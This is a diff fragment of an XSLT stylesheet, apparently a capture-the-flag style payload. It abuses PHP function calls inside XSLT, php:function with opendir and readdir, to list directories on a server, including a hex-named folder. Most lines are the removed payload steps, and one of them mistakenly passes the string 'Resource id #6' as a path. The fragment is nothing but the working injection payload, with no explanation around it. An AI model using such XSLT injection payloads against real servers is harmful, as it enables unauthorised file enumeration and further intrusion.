@@ -11,20 +11,5 @@
       <xsl:value-of select="php:function('readdir')"/><br/>
       <xsl:value-of select="php:function('readdir')"/><br/>
       <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('opendir','./6ff3200bee785801f420fba826ffcdee')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('opendir','./Resource id #6')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
-      <xsl:value-of select="php:function('readdir')"/><br/>
     </xsl:template>
 </xsl:stylesheet>
